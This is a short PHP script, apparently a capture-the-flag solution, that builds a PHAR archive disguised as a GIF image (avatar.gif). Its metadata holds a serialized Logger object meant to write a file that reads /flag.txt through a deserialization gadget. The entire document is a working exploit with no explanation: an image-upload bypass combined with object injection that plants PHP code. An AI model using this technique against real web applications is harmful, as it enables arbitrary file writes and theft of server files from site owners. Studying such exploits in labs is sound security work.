<?php
class Logger { public $logs; public $request; }

$payload = new Logger();
$payload->logs    = 'logMD5.php';
$payload->request = '<?php readfile("/flag.txt"); ?>';
@unlink('p.phar');
$phar = new Phar('p.phar');
$phar->startBuffering();
$phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($payload);
$phar->addFromString('a', 'x');
$phar->stopBuffering();
rename('p.phar','avatar.gif');